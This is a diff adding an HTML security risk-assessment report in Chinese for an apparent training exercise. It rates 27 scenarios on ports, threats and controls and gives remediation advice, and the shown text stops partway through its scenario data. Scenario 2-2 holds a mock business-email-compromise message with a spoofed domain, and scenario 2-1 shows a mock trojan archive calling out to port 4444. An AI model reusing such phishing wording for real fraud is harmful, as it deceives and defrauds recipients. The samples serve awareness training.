@@ -1,0 +1,861 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>資安情境風險分析</title>
+<style>
+  /* ============ 設計變數 ============ */
+  :root {
+    --bg: #0F172A;
+    --bg-2: #111C33;
+    --card: #16213A;
+    --card-2: #1C2A47;
+    --line: #26375A;
+    --text: #E2E8F0;
+    --muted: #94A3B8;
+    --blue: #2563EB;
+    --blue-soft: rgba(37, 99, 235, .16);
+    --green: #10B981;
+    --green-soft: rgba(16, 185, 129, .14);
+    --red: #EF4444;
+    --red-soft: rgba(239, 68, 68, .14);
+    --amber: #F59E0B;
+    --amber-soft: rgba(245, 158, 11, .14);
+    --radius: 14px;
+    --shadow: 0 10px 30px rgba(0, 0, 0, .35);
+    --mono: ui-monospace, "Cascadia Code", Consolas, "Courier New", monospace;
+  }
+
+  * { box-sizing: border-box; }
+  html, body { margin: 0; }
+  html { scroll-behavior: smooth; scroll-padding-top: 76px; }
+  body {
+    background:
+      radial-gradient(1200px 600px at 85% -10%, rgba(37, 99, 235, .18), transparent 60%),
+      radial-gradient(900px 500px at -10% 110%, rgba(16, 185, 129, .08), transparent 60%),
+      var(--bg);
+    background-attachment: fixed;
+    color: var(--text);
+    font-family: "Noto Sans TC", "Microsoft JhengHei", "PingFang TC", system-ui, sans-serif;
+    line-height: 1.7;
+    -webkit-font-smoothing: antialiased;
+  }
+  body::before {
+    content: ""; position: fixed; inset: 0; pointer-events: none; z-index: 0;
+    background-image:
+      linear-gradient(rgba(148, 163, 184, .05) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(148, 163, 184, .05) 1px, transparent 1px);
+    background-size: 40px 40px;
+  }
+  .wrap { position: relative; z-index: 1; max-width: 1080px; margin: 0 auto; padding: 0 16px 56px; }
+
+  /* ============ 頁首與導覽 ============ */
+  header.top {
+    position: sticky; top: 0; z-index: 20;
+    background: rgba(15, 23, 42, .9);
+    backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px);
+    border-bottom: 1px solid var(--line);
+  }
+  .top-inner { max-width: 1080px; margin: 0 auto; padding: 12px 16px; display: flex; align-items: center; gap: 16px; }
+  .brand { display: flex; align-items: center; gap: 10px; min-width: 0; }
+  .brand-icon {
+    width: 34px; height: 34px; border-radius: 9px; flex: none; display: grid; place-items: center;
+    background: linear-gradient(135deg, var(--blue), #1D4ED8); box-shadow: 0 0 18px rgba(37, 99, 235, .5);
+  }
+  .brand b { font-size: 1rem; letter-spacing: .04em; white-space: nowrap; }
+  nav.jump { margin-left: auto; display: flex; gap: 4px; overflow-x: auto; scrollbar-width: none; }
+  nav.jump::-webkit-scrollbar { display: none; }
+  nav.jump a {
+    color: var(--muted); text-decoration: none; font-size: .85rem; white-space: nowrap;
+    padding: 6px 12px; border-radius: 8px; transition: background .15s, color .15s;
+  }
+  nav.jump a:hover { background: var(--card-2); color: var(--text); }
+
+  /* ============ 報告標題 ============ */
+  .hero { padding: 36px 0 8px; }
+  .eyebrow { font-size: .78rem; color: #93C5FD; letter-spacing: .18em; margin: 0 0 6px; }
+  .hero h1 { font-size: clamp(1.6rem, 4vw, 2.2rem); margin: 0 0 8px; line-height: 1.3; }
+  .hero p { color: var(--muted); margin: 0; max-width: 760px; }
+  .meta { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 14px; }
+  .chip {
+    font-size: .76rem; padding: 3px 10px; border-radius: 99px;
+    border: 1px solid var(--line); color: var(--muted); background: rgba(15, 23, 42, .5);
+  }
+
+  /* ============ 區塊與卡片 ============ */
+  section.block { margin-top: 36px; }
+  .sec-title { display: flex; align-items: baseline; gap: 10px; margin: 0 0 14px; font-size: 1.2rem; }
+  .sec-title .no { font-family: var(--mono); color: var(--blue); font-size: .95rem; }
+  .sec-desc { color: var(--muted); margin: -8px 0 16px; font-size: .92rem; }
+  .card {
+    background: linear-gradient(180deg, var(--card), var(--bg-2));
+    border: 1px solid var(--line); border-radius: var(--radius); box-shadow: var(--shadow);
+    padding: 22px;
+  }
+
+  /* KPI */
+  .kpis { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; margin-top: 24px; }
+  .kpi { padding: 16px 18px; }
+  .kpi span { display: block; font-size: .82rem; color: var(--muted); }
+  .kpi b { display: block; font-family: var(--mono); font-size: 2rem; line-height: 1.25; }
+  .kpi small { color: var(--muted); font-size: .78rem; }
+  .kpi.high { border-top: 3px solid var(--red); }   .kpi.high b { color: var(--red); }
+  .kpi.mid  { border-top: 3px solid var(--amber); } .kpi.mid b  { color: var(--amber); }
+  .kpi.low  { border-top: 3px solid var(--green); } .kpi.low b  { color: var(--green); }
+  .kpi.all  { border-top: 3px solid var(--blue); }
+
+  /* 風險概況：矩陣 + 主題分布 */
+  .overview { display: grid; grid-template-columns: minmax(0, 1.15fr) minmax(0, 1fr); gap: 16px; }
+  .card h3 { margin: 0 0 4px; font-size: 1rem; }
+  .card .hint { margin: 0 0 14px; color: var(--muted); font-size: .82rem; }
+
+  .matrix { display: grid; grid-template-columns: 26px repeat(5, minmax(0, 1fr)); gap: 4px; }
+  .matrix .axis { font-size: .72rem; color: var(--muted); display: grid; place-items: center; font-family: var(--mono); }
+  .matrix .cell {
+    min-height: 58px; border-radius: 7px; padding: 4px;
+    display: flex; flex-wrap: wrap; align-content: flex-start; gap: 3px;
+    border: 1px solid rgba(255, 255, 255, .04);
+  }
+  .cell.z-low  { background: rgba(16, 185, 129, .10); }
+  .cell.z-mid  { background: rgba(245, 158, 11, .12); }
+  .cell.z-high { background: rgba(239, 68, 68, .14); }
+  .dot {
+    font-family: var(--mono); font-size: .68rem; font-weight: 700; line-height: 1;
+    padding: 4px 5px; border-radius: 5px; border: 0; cursor: pointer; color: #0B1222;
+    transition: transform .12s;
+  }
+  .dot:hover, .dot:focus-visible { transform: scale(1.12); outline: 2px solid #fff; outline-offset: 1px; }
+  .dot.high { background: #F87171; } .dot.mid { background: #FBBF24; } .dot.low { background: #34D399; }
+  .axis-label { display: flex; justify-content: space-between; margin-top: 8px; font-size: .75rem; color: var(--muted); padding-left: 30px; }
+  .legend { display: flex; gap: 14px; flex-wrap: wrap; margin-top: 12px; font-size: .78rem; color: var(--muted); }
+  .legend i { display: inline-block; width: 10px; height: 10px; border-radius: 3px; margin-right: 5px; vertical-align: -1px; }
+
+  .topic-row { margin-bottom: 16px; }
+  .topic-row .lbl { display: flex; justify-content: space-between; font-size: .9rem; margin-bottom: 5px; gap: 8px; }
+  .topic-row .lbl span:last-child { color: var(--muted); font-family: var(--mono); font-size: .8rem; white-space: nowrap; }
+  .stack { display: flex; height: 12px; border-radius: 99px; overflow: hidden; background: var(--card-2); gap: 2px; }
+  .stack span { display: block; height: 100%; }
+  .stack .h { background: var(--red); } .stack .m { background: var(--amber); } .stack .l { background: var(--green); }
+  .avg { margin-top: 18px; padding-top: 14px; border-top: 1px dashed var(--line); font-size: .85rem; color: var(--muted); }
+  .avg b { color: var(--text); }
+
+  /* ============ 篩選列 ============ */
+  .filters {
+    position: sticky; top: 59px; z-index: 10;
+    display: flex; flex-wrap: wrap; gap: 10px; align-items: center;
+    padding: 12px; margin-bottom: 16px;
+    background: rgba(17, 28, 51, .94); backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px);
+    border: 1px solid var(--line); border-radius: 12px;
+  }
+  .seg { display: flex; flex-wrap: wrap; gap: 6px; }
+  .seg button {
+    font: inherit; font-size: .82rem; cursor: pointer;
+    padding: 5px 12px; border-radius: 99px;
+    background: transparent; color: var(--muted); border: 1px solid var(--line);
+    transition: all .15s;
+  }
+  .seg button:hover { color: var(--text); border-color: #3B5B92; }
+  .seg button[aria-pressed="true"] { background: var(--blue); border-color: var(--blue); color: #fff; }
+  .search {
+    flex: 1 1 200px; min-width: 0;
+    font: inherit; font-size: .88rem; color: var(--text);
+    background: var(--bg); border: 1px solid var(--line); border-radius: 9px; padding: 7px 12px;
+  }
+  .search:focus { outline: 2px solid var(--blue); outline-offset: 0; }
+  .count { font-size: .8rem; color: var(--muted); white-space: nowrap; }
+
+  /* ============ 情境分析卡 ============ */
+  .group-head { margin: 26px 0 12px; display: flex; align-items: center; gap: 10px; font-size: 1rem; color: #93C5FD; }
+  .group-head::after { content: ""; flex: 1; height: 1px; background: var(--line); }
+  .scenarios { display: grid; gap: 14px; }
+  .sc { padding: 0; overflow: hidden; scroll-margin-top: 140px; transition: box-shadow .3s; }
+  .sc.flash { box-shadow: 0 0 0 2px var(--blue), var(--shadow); }
+  .sc-head { display: flex; gap: 14px; align-items: flex-start; padding: 18px 20px 14px; }
+  .sc-id {
+    flex: none; font-family: var(--mono); font-weight: 700; font-size: .85rem;
+    padding: 4px 8px; border-radius: 7px; background: var(--card-2); border: 1px solid var(--line);
+  }
+  .sc-main { flex: 1; min-width: 0; }
+  .sc-scene { margin: 0; font-size: 1.02rem; }
+  .sc-ident { margin-top: 8px; display: flex; flex-wrap: wrap; align-items: center; gap: 8px; font-size: .9rem; }
+  .sc-ident .k { color: var(--muted); font-size: .8rem; }
+  .sc-ident b { color: #93C5FD; }
+  .note { margin: 4px 0 0; font-size: .84rem; color: var(--muted); }
+  .tag { font-family: var(--mono); font-size: .75rem; padding: 1px 8px; border-radius: 6px; background: var(--blue-soft); color: #BFDBFE; border: 1px solid rgba(37, 99, 235, .45); }
+  .score { flex: none; text-align: center; min-width: 74px; }
+  .score .lv { display: block; font-size: .78rem; font-weight: 700; padding: 2px 10px; border-radius: 99px; }
+  .score .num { display: block; font-family: var(--mono); font-size: 1.35rem; font-weight: 700; margin-top: 4px; line-height: 1.1; }
+  .score small { display: block; color: var(--muted); font-size: .7rem; font-family: var(--mono); }
+  .lv.high { color: #FCA5A5; background: var(--red-soft); border: 1px solid rgba(239, 68, 68, .5); }
+  .lv.mid  { color: #FCD34D; background: var(--amber-soft); border: 1px solid rgba(245, 158, 11, .5); }
+  .lv.low  { color: #6EE7B7; background: var(--green-soft); border: 1px solid rgba(16, 185, 129, .5); }
+  .num.high { color: var(--red); } .num.mid { color: var(--amber); } .num.low { color: var(--green); }
+
+  .sc-body { display: grid; grid-template-columns: minmax(0, 1fr) minmax(0, 1fr); border-top: 1px solid var(--line); }
+  .sc-body > div { padding: 16px 20px; }
+  .sc-body > div + div { border-left: 1px solid var(--line); }
+  .sc h4 { margin: 0 0 8px; font-size: .82rem; letter-spacing: .08em; color: #93C5FD; }
+  .sc p.txt { margin: 0; color: #CBD5E1; font-size: .93rem; }
+  .sc ul { margin: 0; padding-left: 1.15em; color: #CBD5E1; font-size: .92rem; }
+  .sc li { margin: 3px 0; }
+  .sc li::marker { color: var(--green); }
+  .source {
+    margin: 0 0 10px; padding: 8px 12px; border-radius: 8px; font-size: .88rem;
+    background: var(--green-soft); border: 1px solid rgba(16, 185, 129, .35); color: #A7F3D0;
+  }
+  .source span { display: block; font-size: .72rem; color: #6EE7B7; letter-spacing: .08em; }
+  .sc-foot {
+    display: flex; flex-wrap: wrap; gap: 6px; align-items: center; justify-content: space-between;
+    padding: 10px 20px; border-top: 1px solid var(--line); background: rgba(15, 23, 42, .45);
+  }
+  .kw { display: flex; flex-wrap: wrap; gap: 5px; }
+  .kw span { font-size: .72rem; padding: 1px 7px; border-radius: 5px; background: var(--card-2); color: var(--muted); border: 1px solid var(--line); }
+  .ref { font-size: .76rem; color: var(--muted); white-space: nowrap; }
+  .empty { text-align: center; color: var(--muted); padding: 40px 0; }
+
+  /* 模擬郵件 / 簡訊 / 日誌 */
+  .mock { margin: 12px 0 0; background: #0B1222; border: 1px solid #334155; border-left: 4px solid #64748B; border-radius: 10px; overflow: hidden; font-size: .88rem; }
+  .mock-head { display: flex; align-items: center; gap: 8px; padding: 6px 12px; background: #131C30; border-bottom: 1px solid #334155; font-size: .72rem; color: var(--muted); letter-spacing: .06em; }
+  .mock-head .dots { display: flex; gap: 4px; }
+  .mock-head .dots i { width: 8px; height: 8px; border-radius: 50%; background: #475569; display: block; }
+  .mock-body { padding: 10px 12px; }
+  .mock-meta { color: var(--muted); font-size: .82rem; border-bottom: 1px dashed #334155; padding-bottom: 6px; margin-bottom: 6px; }
+  .mock-meta div { word-break: break-all; }
+  .mock-meta b { color: #CBD5E1; font-weight: 500; }
+  .mock p { margin: 0 0 4px; }
+  .mock.log .mock-body, .mock.file .mock-body { font-family: var(--mono); font-size: .78rem; white-space: pre-wrap; word-break: break-all; color: #A7F3D0; }
+  .mock.email { border-left-color: var(--amber); }
+  .mock.sms { border-left-color: var(--green); }
+  .mock.log, .mock.file { border-left-color: var(--red); }
+
+  /* ============ 總結 ============ */
+  .summary-lead { font-size: 1.02rem; color: #CBD5E1; margin: 0; }
+  .summary-lead b { color: var(--text); }
+  .themes { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 12px; margin-top: 16px; }
+  .theme { padding: 16px 18px; }
+  .theme h3 { font-size: .98rem; display: flex; align-items: center; gap: 8px; margin-bottom: 6px; }
+  .theme p { margin: 0 0 10px; color: #CBD5E1; font-size: .88rem; }
+  .theme .refs { display: flex; flex-wrap: wrap; gap: 4px; }
+  .theme .refs .dot { font-size: .66rem; }
+
+  .roadmap { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 12px; }
+  .phase { padding: 18px; position: relative; }
+  .phase .when { font-family: var(--mono); font-size: .76rem; letter-spacing: .08em; }
+  .phase h3 { margin: 2px 0 10px; }
+  .phase.p1 { border-top: 3px solid var(--red); }   .phase.p1 .when { color: #FCA5A5; }
+  .phase.p2 { border-top: 3px solid var(--amber); } .phase.p2 .when { color: #FCD34D; }
+  .phase.p3 { border-top: 3px solid var(--green); } .phase.p3 .when { color: #6EE7B7; }
+  .phase ul { margin: 0; padding-left: 1.1em; color: #CBD5E1; font-size: .9rem; }
+  .phase li { margin: 5px 0; }
+  .phase li::marker { color: var(--muted); }
+  .phase li small { color: var(--muted); font-family: var(--mono); }
+
+  .conclusion { margin-top: 16px; border-left: 4px solid var(--blue); }
+  .conclusion p { margin: 0 0 10px; color: #CBD5E1; }
+  .conclusion p:last-child { margin: 0; }
+  .method { margin-top: 16px; font-size: .82rem; color: var(--muted); }
+  .method b { color: #CBD5E1; }
+
+  footer { margin-top: 40px; text-align: center; color: var(--muted); font-size: .78rem; }
+
+  /* ============ 響應式 ============ */
+  @media (max-width: 900px) {
+    .overview { grid-template-columns: 1fr; }
+    .themes, .roadmap { grid-template-columns: 1fr 1fr; }
+  }
+  @media (max-width: 640px) {
+    .kpis { grid-template-columns: repeat(2, 1fr); }
+    .themes, .roadmap { grid-template-columns: 1fr; }
+    .sc-body { grid-template-columns: 1fr; }
+    .sc-body > div + div { border-left: 0; border-top: 1px solid var(--line); }
+    .sc-head { flex-wrap: wrap; padding: 16px; }
+    .sc-main { flex-basis: calc(100% - 60px); }
+    .score { display: flex; align-items: center; gap: 10px; min-width: 0; margin-left: 52px; }
+    .score .num { margin: 0; }
+    .sc-body > div, .sc-foot { padding-left: 16px; padding-right: 16px; }
+    .card { padding: 18px 16px; }
+    .brand b { font-size: .92rem; }
+    .filters { top: 59px; }
+    .matrix .cell { min-height: 48px; }
+  }
+
+  /* ============ 列印 ============ */
+  @media print {
+    body { background: #fff; color: #111; }
+    body::before, header.top, .filters, nav.jump { display: none !important; }
+    .card { box-shadow: none; background: #fff; border-color: #ccc; break-inside: avoid; }
+    .sc-scene, .sc p.txt, .sc ul, .summary-lead, .conclusion p, .theme p, .phase ul { color: #111; }
+  }
+  @media (prefers-reduced-motion: reduce) {
+    html { scroll-behavior: auto; }
+    *, *::before, *::after { transition: none !important; }
+  }
+</style>
+</head>
+<body>
+
+<header class="top">
+  <div class="top-inner">
+    <div class="brand">
+      <div class="brand-icon" aria-hidden="true">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>
+      </div>
+      <b>資安情境風險分析</b>
+    </div>
+    <nav class="jump" aria-label="章節">
+      <a href="#overview">風險概況</a>
+      <a href="#analysis">情境分析</a>
+      <a href="#summary">總結與建議</a>
+    </nav>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <!-- ============ 報告標題 ============ -->
+  <div class="hero">
+    <p class="eyebrow">RISK ASSESSMENT REPORT</p>
+    <h1>資安情境演練：風險識別與分析總結</h1>
+    <p>依據「資安情境演練對應表」四大主題共 27 個情境，逐一識別對應的服務、威脅或控制措施，以「可能性 × 衝擊」評估風險等級，並彙整防範建議與整體改善優先順序。</p>
+    <div class="meta">
+      <span class="chip">產出日期：2026-09-30</span>
+      <span class="chip">來源：資安情境演練對應表.xlsx</span>
+      <span class="chip">對應教材：網路基礎概論、資安核心概念</span>
+    </div>
+  </div>
+
+  <div class="kpis" id="kpis"></div>
+
+  <!-- ============ 1. 風險概況 ============ -->
+  <section class="block" id="overview">
+    <h2 class="sec-title"><span class="no">01</span>風險概況</h2>
+    <div class="overview">
+      <div class="card">
+        <h3>風險矩陣（可能性 × 衝擊）</h3>
+        <p class="hint">點擊情境編號可跳至該情境的詳細分析。</p>
+        <div class="matrix" id="matrix" role="grid" aria-label="風險矩陣"></div>
+        <div class="axis-label"><span>可能性 低 →</span><span>→ 高</span></div>
+        <div class="legend">
+          <span><i style="background:#EF4444"></i>高風險（分數 ≥ 15）</span>
+          <span><i style="background:#F59E0B"></i>中風險（8–14）</span>
+          <span><i style="background:#10B981"></i>低風險（≤ 7）</span>
+        </div>
+      </div>
+      <div class="card">
+        <h3>各主題風險分布</h3>
+        <p class="hint">長條依高／中／低風險情境數量堆疊。</p>
+        <div id="topicDist"></div>
+        <div class="avg" id="avgBox"></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ 2. 情境分析 ============ -->
+  <section class="block" id="analysis">
+    <h2 class="sec-title"><span class="no">02</span>情境風險識別與分析</h2>
+    <p class="sec-desc">主題 1、2 評估情境本身暴露的風險；主題 3、4 為控制措施，評估的是「若未落實該措施」時組織將面臨的風險。</p>
+
+    <div class="filters">
+      <div class="seg" id="topicFilter" role="group" aria-label="主題篩選"></div>
+      <div class="seg" id="riskFilter" role="group" aria-label="風險等級篩選"></div>
+      <input class="search" id="search" type="search" placeholder="搜尋情境、關鍵字、協定…" aria-label="搜尋">
+      <span class="count" id="count"></span>
+    </div>
+    <div id="list"></div>
+  </section>
+
+  <!-- ============ 3. 總結 ============ -->
+  <section class="block" id="summary">
+    <h2 class="sec-title"><span class="no">03</span>總結與建議</h2>
+    <div class="card"><p class="summary-lead" id="lead"></p></div>
+
+    <h3 class="group-head">六大風險主軸</h3>
+    <div class="themes" id="themes"></div>
+
+    <h3 class="group-head">改善優先順序</h3>
+    <div class="roadmap">
+      <div class="card phase p1">
+        <span class="when">立即｜0–1 個月</span>
+        <h3>止血：關閉高曝險入口</h3>
+        <ul>
+          <li>RDP 3389、SQL 1433 停止對外開放，改經 VPN／跳板機 <small>1-6 1-7</small></li>
+          <li>管理者與遠端帳號強制 MFA，啟用登入失敗鎖定 <small>3-2 4-8</small></li>
+          <li>匯款與帳戶變更一律電話雙重確認 <small>2-2 4-5</small></li>
+          <li>禁用盜版軟體，端點全面部署 EDR <small>2-1</small></li>
+        </ul>
+      </div>
+      <div class="card phase p2">
+        <span class="when">短期｜1–3 個月</span>
+        <h3>補強：加密與邊界防護</h3>
+        <ul>
+          <li>全站 HTTPS（TLS 1.2+），FTP／POP3／IMAP 改用加密版本 <small>1-1~1-5 3-3</small></li>
+          <li>部署 WAF、防火牆與 IDS/IPS，導入 DDoS 清洗 <small>3-5 4-7 2-4</small></li>
+          <li>敏感資料 AES-256 靜態加密與去識別化 <small>3-4 4-9</small></li>
+          <li>建立修補程式管理流程 <small>2-3</small></li>
+        </ul>
+      </div>
+      <div class="card phase p3">
+        <span class="when">中期｜3–6 個月</span>
+        <h3>制度化：管理與持續運作</h3>
+        <ul>
+          <li>成立資安應變小組，依風險分配預算 <small>4-1 4-2</small></li>
+          <li>制定 BCM／DR 計畫並實際演練切換 <small>4-3</small></li>
+          <li>RBAC 權限盤點、不可竄改稽核日誌 <small>3-1 3-6</small></li>
+          <li>第三方廠商風險評估；定期教育訓練與社交工程演練 <small>2-5 4-4 4-6</small></li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="card conclusion">
+      <h3 style="margin:0 0 10px">結論</h3>
+      <p>本次 27 個情境中，<b>高風險佔三分之二</b>，顯示組織目前最大的問題不是缺少單一工具，而是<b>「明文傳輸＋服務直接暴露＋單一密碼」</b>三者疊加：攻擊者可以從網路直接接觸到 RDP、資料庫與未加密網站，一旦取得一組密碼即可長驅直入。</p>
+      <p>同時，實際造成損失的情境（300 萬詐騙匯款、破解包木馬）都源自<b>「人」</b>，技術防護無法單獨解決。建議以「先關入口、再加密、後制度化」的順序推進，並將社交工程演練與電話覆核機制列為常態作業。</p>
+      <p>策略面的組織、預算與營運持續計畫，是讓上述技術與管理措施能長期維持的基礎，應由高層明確授權並定期檢視成效。</p>
+    </div>
+
+    <p class="method"><b>評估方法：</b>風險分數 = 可能性（1–5）× 衝擊（1–5）。可能性考量攻擊門檻與常見程度；衝擊考量資料外洩、財務損失與營運中斷程度。分數為依情境描述所做的專業判斷，實際導入時應依組織資產與現況重新校準。</p>
+  </section>
+
+  <footer>資安情境演練：風險識別與分析總結・單一檔案離線可用</footer>
+</main>
+
+<script>
+/* =========================================================
+ * 情境資料（依「資安情境演練對應表.xlsx」四個工作表整理）
+ * ident：識別結果；tag：Port／管控面向；L：可能性；I：衝擊
+ * source：表列對應防禦（原表內容）；tips：專家補充建議
+ * ========================================================= */
+const GROUPS = {
+  1: "TCP Port No. 識別",
+  2: "資安威脅",
+  3: "系統安全開發 (SSDLC)",
+  4: "資安管控模式"
+};
+
+const DATA = [
+  /* ---------- 1. TCP Port No. 識別 ---------- */
+  { g: 1, id: "1-1", ident: "FTP (File Transfer Protocol)", tag: "Port 21", L: 4, I: 3,
+    scene: "貨車司機完成送貨，透過物流公司網頁傳送電子檔／貨單資料。",
+    risk: "FTP 以明文傳送帳號、密碼與檔案內容，同網段的攻擊者可直接側錄。貨單中的客戶地址、電話等個資會一併外露，帳密被盜後也可能遭上傳惡意檔案。",
+    source: "未加密之用戶端與伺服器間檔案傳輸",
+    tips: ["改用 SFTP（Port 22）或 FTPS（Port 990）加密傳輸", "停用匿名登入，限制可連線的來源 IP", "上傳目錄禁止執行權限，並對上傳檔案做防毒掃描"],
+    kw: "FTP, Port 21, 檔案傳輸協定, 明文傳輸, 檔案上傳下載", page: "網路基礎概論 第43頁" },
+
+  { g: 1, id: "1-2", ident: "HTTP (Hypertext Transfer Protocol)", tag: "Port 80", L: 4, I: 4,
+    scene: "物流公司現有網站未具備安全加密，進行明文傳輸。",
+    risk: "登入帳密、訂單與個資在傳輸途中可被竊聽，也可能遭中間人（MITM）竄改頁面內容、植入惡意連結。瀏覽器會標示「不安全」，同時影響客戶信任。",
+    source: "未加密之標準網頁瀏覽服務",
+    tips: ["全站導入 HTTPS，並將 Port 80 請求強制轉址至 443", "啟用 HSTS，避免被降級回明文連線", "改版完成前，登入與表單頁面不得以 HTTP 提供"],
+    kw: "HTTP, Port 80, 明文傳輸, 未加密網頁, Web服務", page: "網路基礎概論 第43頁" },
+
+  { g: 1, id: "1-3", ident: "HTTPS (HTTP Secure)", tag: "Port 443", L: 2, I: 3,
+    scene: "網站安全性提升，預計一週後採用 SSL/TLS 進行加密傳輸。",
+    risk: "導入後的目標架構風險低。需留意兩點：這一週過渡期內網站仍為明文、風險尚未消除；以及 TLS 版本過舊或憑證過期仍會造成弱點與服務中斷。",
+    source: "透過 SSL/TLS 加密之安全網頁瀏覽服務",
+    tips: ["使用 TLS 1.2 以上版本，停用 SSLv3 / TLS 1.0 / 1.1", "設定憑證自動續期與到期監控", "過渡期間暫停或限制敏感功能（如線上付款）"],
+    kw: "HTTPS, Port 443, SSL/TLS, 加密傳輸, 安全網頁", page: "網路基礎概論 第44頁" },
+
+  { g: 1, id: "1-4", ident: "POP3 (Post Office Protocol v3)", tag: "Port 110", L: 3, I: 3,
+    scene: "員工習慣傳統收信方式，將郵件全部下載到個人電腦 PC 上。",
+    risk: "110 為明文協定，帳密可能外洩。郵件預設自伺服器刪除並集中於單一電腦，一旦電腦遺失、中毒或硬碟損壞，郵件即外洩或永久遺失，也不利事後稽核。",
+    source: "將郵件接收至在地電腦，預設自伺服器端刪除",
+    tips: ["改用 POP3S（Port 995）加密連線", "個人電腦啟用磁碟加密並定期備份郵件", "評估改用 IMAP／雲端信箱集中管理"],
+    kw: "POP3, Port 110, 郵局協定, 郵件下載, 伺服器端刪除", page: "網路基礎概論 第44頁" },
+
+  { g: 1, id: "1-5", ident: "IMAP (Internet Message Access Protocol)", tag: "Port 143", L: 3, I: 3,
+    scene: "員工使用手機／平板等多裝置，需即時同步看到相同最新信件。",
+    risk: "裝置越多，帳號被盜用或裝置遺失導致郵件外洩的機會越高；143 若未加密也會外洩帳密。任一裝置被入侵，全部信件皆可被讀取。",
+    source: "郵件保留於伺服器上，支援多裝置跨平台同步",
+    tips: ["改用 IMAPS（Port 993）加密連線", "信箱帳號啟用多因子驗證（MFA）", "行動裝置設定螢幕鎖與遠端抹除（MDM）"],
+    kw: "IMAP, Port 143, 訊息存取協定, 多裝置同步, 伺服器保留", page: "網路基礎概論 第44頁" },
+
+  { g: 1, id: "1-6", ident: "MS SQL Server 資料庫服務", tag: "Port 1433", L: 4, I: 5,
+    scene: "後台工程師使用管理程式連線至 Microsoft SQL Server 資料庫。",
+    risk: "若 1433 直接暴露於網際網路，常成為暴力破解 sa 帳號、SQL 注入後橫向移動與勒索軟體入侵的入口。資料庫是核心資產，一旦得手即是全面資料外洩。",
+    source: "微軟 SQL Server 資料庫引擎預設接聽通訊埠",
+    tips: ["1433 不對外開放，僅允許經 VPN 或跳板機連線", "停用或更名 sa 帳號，採最小權限的專用帳號", "強制加密連線並開啟登入稽核"],
+    kw: "MS SQL Server, Port 1433, 資料庫引擎, 後台管理, 資料查詢", page: "網路基礎概論 第44頁" },
+
+  { g: 1, id: "1-7", ident: "RDP (Remote Desktop Protocol)", tag: "Port 3389", L: 5, I: 5,
+    scene: "工程師在自家電腦透過遠端連線，直接觀看微軟主機桌面圖形介面。",
+    risk: "3389 是全球最常被掃描與暴力破解的連接埠之一，也是勒索軟體最常見的初始入侵管道。攻擊者取得 RDP 即等同坐在主機前，可完全控制系統。",
+    source: "微軟 Windows 內建圖形化遠端桌面連線服務",
+    tips: ["不直接對外開放 3389，改經 VPN 或 RD Gateway", "啟用網路層級驗證（NLA）與多因子驗證", "設定帳號鎖定原則並監控異常登入"],
+    kw: "RDP, Port 3389, 遠端桌面協定, 圖形化介面, 微軟Windows", page: "網路基礎概論 第44頁" },
+
+  /* ---------- 2. 資安威脅 ---------- */
+  { g: 2, id: "2-1", ident: "木馬 (Trojan) / 惡意軟體下載", L: 4, I: 5,
+    scene: "美玲為圖方便下載「免費破解包」，執行後後台自動建立外部連線並私下發送封包。",
+    mock: { type: "file", title: "下載的檔案",
+      text: "📦 Office_2026_Pro_Crack_免安裝.zip\n  ├─ Setup_Crack.exe      (簽章：無)\n  └─ 必讀.txt  「安裝前請先關閉防毒軟體！」\n\n[背景連線] Setup_Crack.exe → 185.xx.xx.17:4444  ESTABLISHED" },
+    risk: "偽裝成實用軟體、執行後暗中建立後門外聯，是典型木馬行為。攻擊者可遠端控制電腦、竊取帳密與檔案，並以此為跳板入侵公司內網；使用盜版軟體另有法律風險。",
+    source: "禁用未授權盜版軟體、安裝EDR/防毒軟體、網路封包監控與外聯阻斷",
+    tips: ["一般使用者不給予本機管理員權限，限制自行安裝軟體", "建立合法軟體申請管道，降低找破解版的動機", "異常外聯觸發告警時立即隔離主機"],
+    kw: "木馬, 病毒, 惡意軟體, 破解包, 後門連線, 軟體漏洞", page: "資安核心概念 第9頁" },
+
+  { g: 2, id: "2-2", ident: "電子郵件社交工程 / 網路釣魚 (Phishing)", L: 5, I: 5,
+    scene: "會計小張收到偽造越南布料供應商的急件 Email，未電話確認即核准匯款 300 萬。",
+    mock: { type: "email", title: "情境重現",
+      from: "Viet Textile Co., Ltd &lt;sales@viet-textiIe.com&gt;",
+      subject: "【急件】匯款帳戶變更通知 — 請今日完成付款",
+      body: ["因本公司銀行帳戶年度稽核，本期貨款 <b>NT$3,000,000</b> 請改匯至新帳戶，並於<b>今日下午 3 點前</b>完成。", "負責人目前出國中，<b>請勿來電</b>，有問題請直接回信。"] },
+    risk: "偽造寄件者（網域以大寫 I 冒充小寫 l）、製造急迫感、變更匯款帳戶、刻意阻止電話確認，是典型的商業電子郵件詐騙（BEC）。本情境已造成實際財務損失，屬最高風險等級。",
+    source: "實施雙重電話確認機制、社交工程社交防護宣導、電郵郵件標籤與SPF/DKIM驗證",
+    tips: ["帳戶變更一律以「既有」電話號碼回撥確認，不使用信中聯絡方式", "大額匯款設雙人覆核與等待期", "郵件閘道啟用 DMARC 並對外部郵件加註警示標籤"],
+    kw: "電子郵件社交工程, 網路釣魚, 偽造寄件者, 詐騙匯款, 社交工程演練", page: "資安核心概念 第9頁" },
+
+  { g: 2, id: "2-3", ident: "零時差攻擊 / 程式漏洞攻擊", L: 3, I: 5,
+    scene: "駭客利用未被發現的系統盲點與程式漏洞，無預警繞過防護並竊取大量核心敏感資料。",
+    risk: "利用廠商尚未發現或尚未修補的漏洞發動攻擊，沒有現成的修補程式與特徵碼，傳統防毒難以偵測。發生機率相對較低，但一旦成功衝擊極大。",
